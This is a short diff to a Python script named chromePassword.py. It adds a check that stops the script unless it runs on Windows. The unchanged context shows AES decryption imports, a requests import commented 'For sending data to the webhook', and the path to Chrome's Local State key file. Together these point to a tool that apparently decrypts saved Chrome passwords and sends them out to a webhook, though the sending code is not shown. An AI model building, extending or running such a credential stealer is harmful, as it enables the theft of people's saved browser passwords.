@@ -9,6 +9,12 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 import requests  # For sending data to the webhook
+import platform
+import sys
+
+if platform.system() != "Windows":
+    sys.stderr.write("chromePassword.py can only run on Windows.\n")
+    sys.exit(0)
 
 # GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
